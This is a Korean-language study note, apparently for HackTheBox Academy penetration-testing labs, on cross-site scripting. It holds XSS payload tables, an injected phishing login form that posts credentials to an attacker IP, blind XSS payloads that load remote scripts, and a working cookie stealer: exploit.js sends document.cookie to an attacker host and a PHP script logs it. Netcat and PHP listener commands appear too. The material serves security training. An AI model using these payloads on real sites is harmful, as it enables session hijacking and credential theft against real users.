# XSS

## XSS(교차 사이트 스크립팅)



> Burp Suite Certified Practitioner (BSCP) [XSS에 대한 나의 연구 노트](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#cross-site-scripting)

### 명령



| 암호                                                                                               | 설명                                                                                                                                        |
| ------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------- |
| **XSS 페이로드**                                                                                     |                                                                                                                                           |
| `<script>alert(window.origin)</script>`                                                          | 기본 XSS 페이로드 [XSS 테스트 페이로드](https://academy.hackthebox.com/module/103/section/967)                                                         |
| `<script>alert(document.cookie)</script>`                                                        | 플래그를 얻으려면 위에서 사용한 것과 동일한 페이로드를 사용하되, URL을 표시하는 대신 쿠키를 표시하도록 JavaScript 코드를 변경하세요.                                                         |
| `<plaintext>`                                                                                    | 기본 XSS 페이로드                                                                                                                               |
| `http://94.237.62.82:55501/index.php?task=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E` | 백엔드 서버에서 처리되는 반사 XSS와 클라이언트 측에서 완전히 처리되고 백엔드 서버에 도달하지 않는 DOM 기반 XSS입니다.                                                                   |
| `document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);`   | [클라이언트 브라우저의 JavaScript 소스에서 DOM-XSS를 식별합니다.](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#identify-dom-xss) |
| `<script>print()</script>`                                                                       | 기본 XSS 페이로드                                                                                                                               |
| `<img src="" onerror=alert(window.origin)>`                                                      | HTML 기반 XSS 페이로드                                                                                                                          |
| `<img src="" onerror=alert(document.cookie)>`                                                    | [DOM 공격](https://academy.hackthebox.com/module/103/section/974)                                                                           |
| `<script>document.body.style.background = "#141d2b"</script>`                                    | 배경색 변경                                                                                                                                    |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`    | 배경 이미지 변경                                                                                                                                 |
| `<script>document.title = 'HackTheBox Academy'</script>`                                         | 웹사이트 제목 변경                                                                                                                                |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                   | 웹사이트 본문 덮어쓰기                                                                                                                              |
| `<script>document.getElementById('urlform').remove();</script>`                                  | 특정 HTML 요소 제거                                                                                                                             |
| `<script src="http://OUR_IP/script.js"></script>`                                                | 원격 스크립트 로드                                                                                                                                |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`                  | 우리에게 쿠키 세부 정보 보내기                                                                                                                         |
| **명령**                                                                                           |                                                                                                                                           |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                              | `xsstrike`URL 매개변수로 실행                                                                                                                    |
| `sudo nc -lvnp 80`                                                                               | `netcat`리스너 시작                                                                                                                            |
| `sudo php -S 0.0.0.0:80`                                                                         | `PHP`피해자가 공격자로부터 원격 스크립트를 로드할 수 있도록 서버를 시작합니다 .                                                                                           |

### XSS 식별



> XSS를 식별하기 위한 보호 기능이 없는 대상에 대한 간단한 테스트 페이로드: [XSS 검색](https://academy.hackthebox.com/module/103/section/982)

```
<script>alert('pass')</script>
```

[![xss-식별](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-identify.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-identify.png)

### 피싱 + XSS



> [피싱](https://academy.hackthebox.com/module/103/section/984)

> 서버의 '/phishing'에 있는 이미지 URL 형식에 대해 작동하는 XSS 페이로드를 찾아보세요 `http://10.129.63.83/phishing/index.php`. 그런 다음 이 섹션에서 배운 내용을 사용하여 악성 로그인 양식을 삽입하는 악성 URL을 준비하세요. 그런 다음 '/phishing/send.php'를 방문하여 피해자에게 URL을 보냅니다. 피해자 사용자는 악성 로그인 양식으로 로그인하게 됩니다. 모든 작업을 올바르게 수행했다면 피해자의 로그인 자격 증명을 받아야 합니다. 획득한 피해자 로그인을 사용하여 '/phishing/login.php'에 접근하고 플래그를 획득하세요.

> 아래 소스 코드에서 확인된 XSS 주입 지점:

[![xss-소스 코드-검토](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-source-code-review.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-source-code-review.png)

> 아래에서는 `'>`소스 코드 img 태그를 분리하는 데 사용됩니다.

```
http://10.129.63.83/phishing/index.php?url=http://10.10.15.41/image.png'><script>alert('xss found')</script>
```

[![xss-피싱-발견](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-phishing-found.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-phishing-found.png)

> 로그인 폼 인젝션 피싱 공격

```
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

> 위를 사용하여 단일 JavaScript 쿠키 스틸러를 한 줄로 만듭니다.

```
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.41><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

[![xss 정리](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-cleanup.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-cleanup.png)

> 피해자가 로그인하고 대신 자격 증명을 제공하도록 대상 기능 입력 상자를 제거합니다. 소스 코드에서 제거해야 할 HTML 요소는 ID입니다 `urlform`.

```
document.getElementById('urlform').remove();
```

> 위의 제거 기능을 단일 온라인 페이로드와 결합합니다.

```
<script>
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.41><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
</script>
<!--
```

[![XSS-피싱-페이로드-제거-html-id](https://github.com/missteek/cpts-quick-references/raw/main/images/XSS-Phishing-payload-remove-html-id.PNG)](https://github.com/missteek/cpts-quick-references/blob/main/images/XSS-Phishing-payload-remove-html-id.PNG)

> Exploit을 사용하여 피싱 링크 URL을 피해자에게 보냅니다: `http://10.129.63.83/phishing/send.php`.

> 링크가 전송되면 kali 호스팅 `python3 -m http.server 80`서비스는 링크를 클릭하고 정보를 입력한 피해자로부터 자격 증명을 받습니다.

[![xss-피싱-서버](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-phishing-server.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-phishing-server.png)

```
username=admin&password=p1zd0nt57341myp455
```

### 쿠키 도둑



> [BSCP 연구 노트에는 쿠키 스틸러 페이로드](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#dom-based-xss) 의 많은 예가 포함되어 있습니다.

> [쿠키 스틸러(Cookie Stealer) 공격이라고도 불리는 세션 하이재킹(Session Hijacking)](https://academy.hackthebox.com/module/103/section/1008) 입니다.

> 대상 URL:`http://10.129.63.83/hijacking/`

[![쿠키 도둑질 등록](https://github.com/missteek/cpts-quick-references/raw/main/images/cookie-stealer-register.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/cookie-stealer-register.png)

> 대상 응답 메시지를 읽었습니다 `An Admin will review your registration request.`.

> 샘플 자바스크립트 페이로드로 취약한 입력 필드를 식별합니다.`<script src="http://OUR_IP/username"></script>`

#### 원격 JS 파일 포함



> [아래 페이로드를 사용하여 원격 JavaScript 파일을](https://academy.hackthebox.com/module/103/section/1008) 이스케이프하고 로드하는 방법을 테스트합니다 .

```
<script src=http://10.10.15.41/1></script>
'><script src=http://10.10.15.41/2></script>
"><script src=http://10.10.15.41/3></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

> 이 페이로드가 포함된 URL 필드를 성공적으로 식별했습니다: `"><script src=http://10.10.15.41/exploit.js></script>`, 원격 스크립트 로드 중.

> 세션 하이재킹 공격은 피싱 공격과 유사합니다. 공격자에게 필요한 데이터를 전송하려면 JavaScript 페이로드가 필요하고, 전송된 데이터를 캡처하고 구문 분석하려면 공격 호스트에서 호스팅되는 PHP 스크립트가 필요합니다.

#### 쿠키 스틸러 설정



> `php -S 0.0.0.0:80`Kali는 다음 두 파일을 사용하여 PHP 서버를 호스팅합니다 .

> 소스 코드 `exploit.js`:

```
// document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://10.10.15.41/index.php?c='+document.cookie;
```

다음에 대한 PHP 소스 코드 `index.php`:

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

> Burp Suite 페이로드를 보내고 관리자가 매개 `imgurl=`변수에 저장된 XSS 쿠키 스틸러 페이로드가 포함된 페이지 등록을 검토할 때까지 기다립니다.

[![트림-리피터-보내기-쿠키-훔치기-저장-xss](https://github.com/missteek/cpts-quick-references/raw/main/images/burp-repeater-send-cookie-stealer-stored-xss.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/burp-repeater-send-cookie-stealer-stored-xss.png)

> 공격을 실행하고 PHP 익스플로잇 서비스가 관리자 쿠키 값을 수신할 때까지 기다립니다.

[![쿠키 도둑질 악용](https://github.com/missteek/cpts-quick-references/raw/main/images/cookie-stealer-exploit.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/cookie-stealer-exploit.png)

> 도난당한 쿠키 값을 수신하여 `cookies.txt`파일에 저장합니다.

```
Victim IP: 10.129.34.48 | Cookie: cookie=c00k1355h0u1d8353cu23d
```

> 그런 다음 저장된 쿠키 값을 브라우저 세션에 사용하여 `http://victim.htb/login.php`액세스하세요.

> [교정 및 예방 보안 코딩 관행](https://academy.hackthebox.com/module/103/section/1009)

## XSS 기술 평가



> [크로스 사이트 스크립팅 XSS 기술 평가](https://academy.hackthebox.com/module/103/section/1011)

> 평가 블로그에 댓글을 게시하면 메시지가 있습니다 `Your comment is awaiting moderation.`.

[![xss 평가 대기-조정](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-assessmennt-await-moderation.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-assessmennt-await-moderation.png)

> 참조: [PayloadALLTheThings XSS 주입](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)

### 블라인드 XSS 감지



> 블라인드 XSS 취약점은 우리가 액세스할 수 없는 페이지에서 취약점이 트리거될 때 발생합니다.

> Blind XSS를 식별하기 위한 페이로드 테스트 - 원격 스크립트 로드:

```
<script src=http://10.10.15.41></script>
'><script src=http://10.10.15.41></script>
"><script src=http://10.10.15.41></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.41\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.41");a.send();</script>
<script>$.getScript("http://10.10.15.41")</script>
```

[![xss-블라인드 주입 식별](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-blind-injection-identified.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-blind-injection-identified.png)

> 성공적인 페이로드는 다음과 같이 식별됩니다.`'><script src=http://10.10.15.41></script>`

### 세션 하이재킹



> 원격 공격 JavaScript 스크립트 페이로드를 로드합니다. [세션 하이재킹](https://academy.hackthebox.com/module/103/section/1008)

```
'><script src=http://10.10.15.41/exploit.js></script>
```

> 관리자 중재자의 쿠키를 훔치기 위해 블라인드 XSS 주입을 제출합니다.

[![xss-블라인드-포스트 댓글](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-blind-post-comment.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-blind-post-comment.png)

> 쿠키 스틸러는 '플래그' 쿠키의 값을 획득했습니다.

[![xss-평가-관리-쿠키-도난](https://github.com/missteek/cpts-quick-references/raw/main/images/xss-assessmennt-admin-cookie-stolen.png)](https://github.com/missteek/cpts-quick-references/blob/main/images/xss-assessmennt-admin-cookie-stolen.png)

> 도난당한 쿠키의 결과는 파일에 저장됩니다 `cat cookies.txt`.
